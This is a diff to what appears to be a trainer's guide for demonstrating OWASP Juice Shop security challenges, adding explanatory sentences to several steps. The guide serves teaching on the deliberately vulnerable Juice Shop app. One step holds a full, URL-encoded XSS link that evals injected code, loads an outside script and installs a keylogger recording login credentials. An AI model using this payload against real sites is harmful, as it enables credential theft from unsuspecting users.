@@ -29,7 +29,7 @@ You can demonstrate these in order, or select a few at will.
 <details>
 <summary>More info</summary>
 
-This challenge serves to demonstrate how Juice Shop challenges work:
+This challenge serves to explain the structure web pages and to demonstrate how Juice Shop challenges work:
 
 1. Explain how to use the browser's Developer Tools.
 2. Then show how to find the score-board by inspecting the HTML and JavaScript code of the frontpage.
@@ -46,7 +46,7 @@ This challenge serves to demonstrate how Juice Shop challenges work:
 Showcase the XSS demo (more detailed instructions [here](https://pwning.owasp-juice.shop/appendix/trainers.html)):
 
 1. Open the keylogger at (http://localhost:8080/logger.php).
-2. Open this [link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp) in a new tab to start the XSS attack. Your page will run some malicious JS that plays music and shakes to its sound, while it installs a keylogger.
+2. Open this [link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dowasp%22%3BsearchQuery.value%20%3D%20%22owasp%22%3B%60%29%27%3C%2Fimg%3Eowasp) in a new tab to start the XSS attack. Explain why following malicious links is a very common scenario. Your page will run some malicious JS that plays music and shakes to its sound, while it installs a keylogger.
 3. Login as an existing user and see that the credentials are being recorded to the keylogger.
 4. Refresh the web page to unload the attack script.
 </details>
@@ -57,7 +57,7 @@ Showcase the XSS demo (more detailed instructions [here](https://pwning.owasp-ju
 <details>
 <summary>More info</summary>
 
-Explain how to use WebSpy (under `Developer Tools > Spy`) to monitor the requests made by the browser to the Juice Shop website.
+Explain how to use WebSpy (under `Developer Tools > Spy`) to monitor the requests made by the browser to the Juice Shop website. Argue why this is the modus-operandi of many hackers.
 Then show how to submit a zero-star review:
 
 1. Do a regular action: posting a new comment in the *Customer Feedback* page.
